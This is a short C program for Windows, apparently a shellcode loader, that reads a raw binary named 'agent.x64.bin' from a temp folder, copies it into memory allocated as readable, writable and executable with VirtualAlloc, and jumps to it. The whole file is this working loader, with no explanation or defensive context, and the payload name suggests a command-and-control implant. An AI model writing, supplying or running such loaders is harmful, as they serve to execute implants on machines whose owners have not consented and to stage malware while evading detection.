#include <windows.h>
#include <stdio.h>
#include <stdint.h>

int main() {
    FILE* f = fopen("C:/TEMP/CppObfuscator/sample/agent.x64.bin", "rb");
    if (!f) {
        printf("[-] Failed to open raw shellcode\n");
        return 1;
    }

    fseek(f, 0, SEEK_END);
    long size = ftell(f);
    rewind(f);

    unsigned char* shellcode = (unsigned char*)malloc(size);
    if (!shellcode) {
        printf("[-] Memory allocation failed\n");
        fclose(f);
        return 1;
    }

    fread(shellcode, 1, size, f);
    fclose(f);

    printf("[+] Loaded %ld bytes of raw shellcode\n", size);

    void* exec = VirtualAlloc(0, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!exec) {
        printf("[-] VirtualAlloc failed\n");
        return 1;
    }

    memcpy(exec, shellcode, size);
    printf("[+] Shellcode copied to %p\n", exec);

    printf("[*] Executing shellcode...\n");
    ((void(*)())exec)();

    return 0;
}
